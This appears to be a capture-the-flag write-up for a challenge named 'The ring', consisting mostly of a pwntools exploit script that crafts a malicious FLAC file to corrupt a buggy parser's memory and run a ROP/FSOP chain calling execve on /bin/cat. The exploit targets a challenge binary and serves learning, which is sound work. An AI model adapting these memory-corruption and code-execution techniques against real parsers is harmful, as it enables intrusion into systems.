---
title: "- The ring - BHMA "
tags:
  - Pwn
  - CTF 
  - C++
---


a buggy flac parser 

```python
from pwn import *
import struct
import subprocess

pp8 = lambda x: p8(x, endian="big")
pp16 = lambda x: p16(x, endian="big")
pp24 = lambda x: p32(x, endian="big")[1:]
pp32 = lambda x: p32(x, endian="big")
pp64 = lambda x: p64(x, endian="big")

payload = b""
payload += pp32(0x664c6143) # Magic 

# StreamInfo
def blockStreamInfo():
    global payload
    payload += pp8(0x0) # last | type
    payload += pp24(34) # size
    payload += pp16(0) # minBlockSize
    payload += pp16(0) # maxBlockSize
    payload += pp24(0) # minFrameSize
    payload += pp24(0) # maxFrameSize
    payload += pp32(0) # tmp
    payload += pp32(0) # totalSampleCount
    payload += b"\x00"*16 # md5sum

# SeekTable
def blockSeekTable(data):
    global payload
    payload += pp8(0x3) # last | type
    payload += pp24(len(data) * 18) # size

    for d in data:
        payload += pp64(d[0]) # number
        payload += pp64(d[1]) # offset
        payload += pp16(d[2]) # sampleCount

def blockVorbisComment(vendor, data):
    global payload
    payload += pp8(0x4) # last | type
    payload += pp24(4 + len(vendor) + 4 + sum([4 + len(d) for d in data])) # size 

    payload += p32(len(vendor)) # len(vendor)
    payload += vendor # vendor
    payload += p32(len(data)) # count
    for d in data:
        payload += p32(len(d))
        payload += d

def blockApplication(appId, data):
    global payload
    payload += pp8(0x2) # last | type
    payload += pp24(len(data)+4) # size

    payload += pp32(appId) # appId
    payload += data

def blockPicture(mime, data):
    global payload
    payload += pp8(0x6) # last | type
    payload += pp24(4 + (4 + len(mime))*2 + 16 + 4 + len(data)) # size

    payload += pp32(0) # type
    payload += pp32(len(mime)) # len(mime)
    payload += mime # mime
    payload += pp32(len(mime)) # len(mime)
    payload += mime # mime
    payload += pp32(0) # width
    payload += pp32(0) # height
    payload += pp32(0) # colorDepth
    payload += pp32(0) # colorCount
    payload += pp32(len(data)) # dataLength
    payload += data # data

def blockSkip():
    global payload
    payload += pp8(1<<7 | 0x9)
    payload += pp24(0)

blockStreamInfo()

wop_base = 0x5df440

prax = 0x42c2aa
prdi = 0x56edee
prsi = 0x4db0d6
prdx_p = 0x533e76
syscall = 0x54f9f9
ppr = 0x414f6e

flag_name = b""

wop = p64(wop_base + 0x20)
wop += p64(0x0)
wop += p64(wop_base + 0x10)
wop = wop.ljust(0x30, b"\x00")
wop += p64(ppr) + p64(0x0)
wop += p64(0x55e43d)
wop += p64(prdi) + p64(wop_base + 0x98)
wop += p64(prsi) + p64(wop_base + 0x100)
wop += p64(prdx_p) + p64(0x0)*2
wop += p64(prax) + p64(0x3b)
wop += p64(syscall)
wop += b"/bin/cat\x00"
wop += flag_name.ljust(0x30, b"\x00")
wop = wop.ljust(0xd8, b"\x00")
wop += p64(wop_base + 0x10)
wop = wop.ljust(0xf8, b"\x00")
wop += p64(wop_base + 0x10)
wop += p64(wop_base + 0x98) + p64(wop_base + 0xa1) + p64(0x0)


blockSeekTable([(0x1337, 0x1337, 0x1337)])
blockVorbisComment(b"!", [b"a"*0x10])
blockSeekTable([(0x41, 0x5df440, 0xf000)])
blockVorbisComment(wop, [b"b"*0x120])
# blockSeekTable([(0x41, 0x5dc020, 0xf000)])
# blockVorbisComment(p64(0x55e9e3), [b"b"*0x120])

blockSkip()
print(payload)

with open("payload.flac", "wb") as f:
    f.write(payload)

context.terminal = ["terminator"]
# p = remote("localhost", "60700")
p.recvline()

print(p.recvline())
p.sendlineafter("solution: ", input())

with open("payload.flac", "rb") as f:
    p.sendlineafter("Size: ", str(len(f.read())))
    p.recvuntil("File: ")
    p.sendline(payload)

# p = process(["./parser", "payload.flac"])
p = gdb.debug(["./parser", "payload.flac"], """
 b *0x55e43d
 """)

p.interactive()
```

Simply :
    1- overwrite string object 
    2- write to std::cout 
    3- FSOP

